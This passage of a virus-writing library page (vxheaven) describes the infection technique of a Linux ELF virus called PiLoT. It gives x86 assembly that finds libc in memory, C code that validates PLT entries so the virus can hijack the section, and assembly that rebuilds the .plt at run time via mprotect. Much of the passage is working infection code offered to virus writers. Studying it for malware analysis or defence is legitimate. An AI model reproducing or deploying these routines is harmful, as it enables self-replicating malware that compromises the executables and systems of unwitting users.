+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">0x40</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> main<span style="color: #339933;">.</span>next<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>done<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">0x40</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> main<span style="color: #339933;">.</span>done<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">align</span> &nbsp; <span style="color: #ff0000;">8</span><br/>
+sret<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">119</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; sigreturn</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">0x80</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">section</span> <span style="color: #0000ff; font-weight: bold;">.data</span><br/>
+format&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Found ELF at %08x'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp;</div>
+<p>The only thing that is left (as an excercise to the reader) is to check whether the found ELF is indeed the libc, one can do that, for example, by checking the DT_SONAME field in the dynamic segment or by other means.</p>
+<h2>Teaching old ELFs new tricks</h2>
+<p>And a few words about PiLoT's infection routine. It is using the fact that you can replace any loadable section which does not take part in the process of execution and linking of the file. The virus can move (or compress) the .text section and restore it on exit. This virus doing the same with Procedure Linkage Table (.plt section). Nice thing about PLT is that you don't need to save its contents only a few constants.</p>
+<p>Let's look to it closer (this is /bin/ps from my system, address of GOT (Global Offset Table) is 080570e8):</p>
+<pre>
+08048e58
+ 8048e58:  ,--->ff 35 ec 70 05 08       pushl  0x80570ec	; GOT[1] address of link_map
+ 8048e5e:  |||  ff 25 f0 70 05 08       jmp    *0x80570f0	; GOT[2] address of resolve
+           |||
+08048e68 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e7948e80818e8b8b948293a7978b93">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>:
+ 8048e68:  |||  ff 25 f4 70 05 08       jmp    *0x80570f4	; GOT + 12
+ 8048e6e:  |||  68 00 00 00 00          push   $0x0		; 0
+ 8048e73:  ||`--e9 e0 ff ff ff          jmp    8048e58
+	   || 
+08048e78 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f493918093869a9599b4849880">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>:
+ 8048e78:  ||   ff 25 f8 70 05 08       jmp    *0x80570f8	; GOT + 16
+ 8048e7e:  ||   68 08 00 00 00          push   $0x8		; 8
+ 8048e83:  |`---e9 d0 ff ff ff          jmp    8048e58
+	   |	 
+08048e88 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7c0e191d180c0e131f081d1e4e3c0c1008">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>:
+ 8048e88:  |    ff 25 fc 70 05 08       jmp    *0x80570fc	; GOT + 20
+ 8048e8e:  |    68 10 00 00 00          push   $0x10		; 16
+ 8048e93:  `----e9 c0 ff ff ff          jmp    8048e58
+ ...
+</pre>
+<p>Note, that addresses of the GOT entries (<code>jmp *0x?</code>) and offsets in the relocation table (<code>push $0x0</code>) are sorted, and the jump and the end of each function helper is pointing to the beginning of PLT, so you can build PLT table for the given executable from scratch having only the address of GOT. To be sure, PiLoT memorizes values of GOT pointer and offset in relocation table, the number of entries in the table and checks that these values are increasing with the given step. This check could be implemented as follows:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> gotp<span style="color: #339933;">,</span> orel<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; gotp <span style="color: #339933;">=</span> orel <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">16</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> psz<span style="color: #339933;">;</span> i <span style="color: #339933;">+=</span> <span style="color: #0000dd;">16</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>gotp <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>plt <span style="color: #339933;">+</span> i <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: #339933;">-</span> gotp <span style="color: #339933;">!=</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> failed<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>plt <span style="color: #339933;">+</span> i <span style="color: #339933;">+</span> <span style="color: #0000dd;">7</span><span style="color: black;">&#41;</span> <span style="color: #339933;">-</span> orel <span style="color: #339933;">!=</span> <span style="color: #0000dd;">8</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> failed<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; gotp <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>plt <span style="color: #339933;">+</span> i <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; orel <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>plt <span style="color: #339933;">+</span> i <span style="color: #339933;">+</span> <span style="color: #0000dd;">7</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Where <var>plt</var> is the pointer to the .plt section and <var>psz</var> its size.</p>
+<p>The virus must restore the PLT before the main program starts to invoke library functions and since the program itself is started by __libc_start_main() this method is incompatible with EPO. To restore the PLT virus should allocate memory for itself, jump there and reconstruct the table:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore .plt</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebp</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ebp is .plt + 16</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0xf000</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; PROT_READ|PROT_WRITE<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">4096</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; mprotect<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #ff0000;">0x08049000</span> &nbsp; <span style="color: black; font-style: italic;">; first pointer to GOT</span><br/>
+first_got &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">4</span><span style="color: #339933;">-</span>main<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #ff0000;">0x00000000</span> &nbsp; <span style="color: black; font-style: italic;">; first offset in .rel.plt</span><br/>
+first_rel &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">4</span><span style="color: #339933;">-</span>main<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #ff0000;">0xffffffe0</span> &nbsp; <span style="color: black; font-style: italic;">; jump</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #ff0000;">1</span><br/>
+plt_count &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">4</span><span style="color: #339933;">-</span>main<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>fix<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x25ff</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x68</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0xe9</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">8</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; <span style="color: #339933;">.</span>fix<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> PROT_READ|PROT_EXEC<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; mprotect<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">12</span><br/>
+&nbsp;</div>
+<p>Comments are welcome. &lt;<a href="/cdn-cgi/l/email-protection#96fef3e4fba7e2d6e0eeb8f8f3e2fae3eeb8f9e4f1"><span class="__cf_email__" data-cfemail="cea6abbca3ffba8eb8b6e0a0abbaa2bbb6e0a1bca9">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a>&gt;</p>
+<h2>References</h2>
+<ol>
+<li>the grugq "More ELF buggery...", May, 2002, http://seclists.org/bugtraq/2002/May/0249.html</li>
+<li>herm1t <a href="/lib/vhe02.html">"Hashing the elves"</a>, Oct 2007</li>
+</ol>
+[<a style="" href="/lib/?lang=EN&amp;index=UN#vhe05">Back to index</a>] [<a href="/lib/vhe05.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhe05">de</a><a href="/lib/index.php?lang=en&amp;id=vhe05">en</a><a href="/lib/index.php?lang=es&amp;id=vhe05">es</a><a href="/lib/index.php?lang=it&amp;id=vhe05">it</a><a href="/lib/index.php?lang=fr&amp;id=vhe05">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhe05">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhe05">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhe05">ua</a></div>
+<script>/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/\>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
+</html>
